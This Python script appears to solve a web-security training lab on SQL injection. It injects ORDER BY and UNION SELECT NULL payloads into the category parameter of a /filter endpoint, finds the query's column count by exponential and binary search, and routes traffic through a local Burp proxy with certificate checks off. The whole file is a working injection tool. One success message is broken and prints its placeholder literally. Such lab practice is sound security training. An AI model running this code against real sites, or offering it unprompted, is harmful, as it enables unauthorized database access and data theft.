#!/usr/bin/env python3
import sys
import warnings
from typing import Optional
from urllib.parse import urljoin

from requests.exceptions import RequestException
from requests.sessions import Session

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

FILTER_ENDPOINT = "filter"
REQUEST_TIMEOUT = (2, 5)
BURP_PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def is_valid_count(
    session: Session,
    base_url: str,
    attack_type: str,
    column_count: int,
    proxies: Optional[dict] = None,
) -> bool:
    """Returns True if the server responds with HTTP 200 for the payload."""

    # URL construction
    target_url = urljoin(base_url.rstrip("/") + "/", FILTER_ENDPOINT)

    # Payload selection
    if attack_type == "union":
        null_chain = ",".join(["NULL"] * column_count)
        payload = f"Gifts' UNION SELECT {null_chain}--"
    else:
        payload = f"Gifts' ORDER BY {column_count}--"

    try:
        res = session.get(
            target_url,
            params={"category": payload},
            proxies=proxies,
            timeout=REQUEST_TIMEOUT,
            verify=False,
        )
        return res.status_code == 200
    except RequestException as e:
        print(f"[-] Request failed: {e}")
        return False


def find_column_count(
    base_url: str, attack_type: str, proxies: Optional[dict] = None
) -> int:
    """Uses Exponential + Binary Search to find column count"""
    session = Session()

    # Exponential Search to find an upperbound
    print("[*] Finding upper bound...")
    lower_bound = 1
    upper_bound = 1

    # We always use 'order by' for the initial search as it is more reliable for discovery
    while is_valid_count(session, base_url, "order by", upper_bound, proxies):
        lower_bound = upper_bound
        upper_bound *= 2
        if upper_bound > 100:  # Safety break
            break

    # Binary search within the discovered range
    print(f"[*] Binary searching between {lower_bound} and {upper_bound}...")
    discovered_columns = 0
    while lower_bound <= upper_bound:
        mid = (lower_bound + upper_bound) // 2
        if is_valid_count(session, base_url, "order by", mid, proxies):
            discovered_columns = mid
            lower_bound = mid + 1
        else:
            upper_bound = mid - 1

    # Verification with UNION SELECT
    if attack_type == "union" and discovered_columns > 0:
        print(f"[*] Verifying count {discovered_columns} with UNION SELECT...")
        if is_valid_count(session, base_url, "union", discovered_columns, proxies):
            print("[+] UNION SELECT verified successfully!")
        else:
            print(
                "[-] UNION SELECT verification failed (possibly due to data type mismatch)."
            )

    return discovered_columns


def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <url> <attack_type>")
        print("attack_type options: 'union' or 'order by")
        sys.exit(1)

    url = sys.argv[1].strip()
    attack_mode = sys.argv[2].strip().lower()

    col_count = find_column_count(url, attack_mode, BURP_PROXIES)

    if col_count > 0:
        print("[!] SUCCESS: Column identified: {col_count}!\nLab solved.")
    else:
        print("[-] Failed to identify column count!")


if __name__ == "__main__":
    main()
